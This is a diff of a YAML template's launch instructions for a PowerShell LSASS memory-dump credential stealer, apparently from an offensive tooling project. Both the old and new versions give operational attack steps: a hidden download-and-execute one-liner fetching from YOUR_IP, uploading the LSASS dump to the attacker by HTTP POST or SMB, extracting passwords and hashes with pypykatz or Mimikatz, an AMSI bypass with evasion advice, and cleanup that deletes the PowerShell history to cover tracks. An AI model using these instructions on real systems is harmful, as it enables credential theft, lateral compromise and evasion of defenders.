@@ -63,126 +63,50 @@ output:
   launch_instructions: |
     PowerShell LSASS MiniDump Credential Dumper - Launch Instructions
 
-    Prerequisites:
+    Transfer and Execute (In-Memory):
+    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/{{ output_file }}')"
 
-    - Administrator privileges or SeDebugPrivilege required
-    - Target must be Windows (LSASS is Windows-only)
-    - PowerShell execution policy bypass may be needed
-    - DbgHelp.dll must be present (included in Windows by default)
-
-    Step 1: Transfer Script to Target
-
-    Transfer the generated PowerShell script to the target Windows system:
-
-    Using Python HTTP server:
+    Alternative (File-Based Execution):
     python3 -m http.server 8080
+    On target: powershell -ep bypass -c "IWR -Uri http://YOUR_IP:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
 
-    On target (PowerShell as Admin):
-    Invoke-WebRequest -Uri "http://YOUR_IP:8080/{{ output_file }}" -OutFile "{{ output_file }}"
+    Exfiltrate Dump File:
+    python3 -m http.server 8080
+    On target: Invoke-WebRequest -Uri "http://YOUR_IP:8080/upload" -Method POST -InFile "{{ dump_path }}"
 
-    Step 2: Execute Dumper
-
-    Run with execution policy bypass:
-    powershell -ExecutionPolicy Bypass -File {{ output_file }}
-
-    Or load into memory and execute:
-    powershell -ExecutionPolicy Bypass -Command "IEX(Get-Content {{ output_file }} -Raw)"
-
-    Or download and execute in one line:
-    powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/{{ output_file }}')"
-
-    Step 3: Transfer Dump File to Attacker Machine
-
-    From target (PowerShell):
-    Invoke-WebRequest -Uri "http://YOUR_IP:8080/upload" -Method POST -InFile "{{ dump_path }}"
-
-    Or using SMB:
-    On attacker: impacket-smbserver share . -smb2support
+    Or via SMB:
+    impacket-smbserver share . -smb2support
     On target: copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp
 
-    Or exfiltrate via base64:
-    certutil -encode {{ dump_path }} lsass_b64.txt
+    Extract Credentials:
+    pypykatz lsa minidump lsass.dmp
 
-    Step 4: Extract Credentials with Mimikatz
-
-    On attacker machine (Windows):
+    Or with Mimikatz (Windows):
     mimikatz.exe
     sekurlsa::minidump lsass.dmp
     sekurlsa::logonPasswords full
 
-    Or with pypykatz (Linux):
-    pypykatz lsa minidump lsass.dmp
-
     Notes:
-
-    - Default dump path: {{ dump_path }}
-    - Includes AMSI bypass for execution
-    - Uses reflection to avoid detection
-    - Dynamically resolves OpenProcess API
-    - Dump file is typically 50-200 MB in size
-    - Requires admin rights or SeDebugPrivilege
-    - HEAVILY monitored by EDR/AV (high detection rate)
-    - PowerShell Script Block Logging will record execution
-
-    Script Features:
-
-    - AMSI bypass disables antimalware scanning
-    - LookupFunc: Dynamically resolves kernel32.dll functions
-    - getDelegateType: Creates delegates for unmanaged functions
-    - Reflection-based API calls avoid direct P/Invoke
+    - Dump path: {{ dump_path }} (typically 50-200 MB)
+    - Includes AMSI bypass for in-memory execution
+    - Uses reflection to dynamically resolve APIs (evades static detection)
+    - Requires Administrator privileges or SeDebugPrivilege
     - MiniDumpWriteDump with type 2 (full memory dump)
-
-    Extracted Credentials Include:
-
-    - Plaintext passwords (if WDigest enabled)
-    - NTLM hashes
-    - Kerberos tickets (TGT/TGS)
-    - Domain cached credentials
-    - LM hashes (older systems)
-
-    Evasion Tips:
-
-    - Obfuscate script with Invoke-Obfuscation
-    - Use process cloning techniques instead
-    - Implement syscalls to bypass userland hooks
-    - Dump from Volume Shadow Copy instead
-    - Consider comsvcs.dll method as alternative
-
-    Alternative Execution:
-
-    Direct from memory (no file drop):
-    powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/dumper.ps1')"
-
-    Using encoded command:
-    $cmd = Get-Content {{ output_file }} -Raw
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-    $encoded = [Convert]::ToBase64String($bytes)
-    powershell -EncodedCommand $encoded
+    - Extracts plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets, domain cached credentials
+    - HEAVILY monitored by EDR/AV - high detection rate
+    - PowerShell Script Block Logging will record execution (Event ID 4104)
+    - Consider alternatives: comsvcs.dll method, Volume Shadow Copy, process cloning, syscalls
 
     Troubleshooting:
-
     - Access Denied: Run as Administrator or with SeDebugPrivilege
-    - AMSI blocks: Script includes AMSI bypass
+    - AMSI blocks: Script includes bypass; if still blocked, obfuscate with Invoke-Obfuscation
     - File creation fails: Check disk space and path permissions
-    - No credentials extracted: LSASS may be protected (PPL)
-    - EDR blocks: This is expected; technique is well-known
-    - Script execution disabled: Use -ExecutionPolicy Bypass
-
-    Detection:
-
-    Defenders can detect this via:
-    - PowerShell Script Block Logging (Event ID 4104)
-    - AMSI bypass patterns
-    - ProcessAccess events to LSASS (Sysmon Event ID 10)
-    - DbgHelp.dll loading in PowerShell process
-    - Large file creation in suspicious locations
-    - MiniDumpWriteDump API monitoring
+    - No credentials extracted: LSASS may be protected (PPL - Protected Process Light)
+    - EDR blocks: Expected; this technique is well-known to defenders
+    - Sysmon Event ID 10 (ProcessAccess) will fire when accessing LSASS
 
     Cleanup:
-
-    After extraction, securely delete dump file:
-    sdelete64 -p 7 {{ dump_path }}
-
-    Or simply:
+    On target:
     Remove-Item {{ dump_path }} -Force
     Remove-Item {{ output_file }} -Force
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
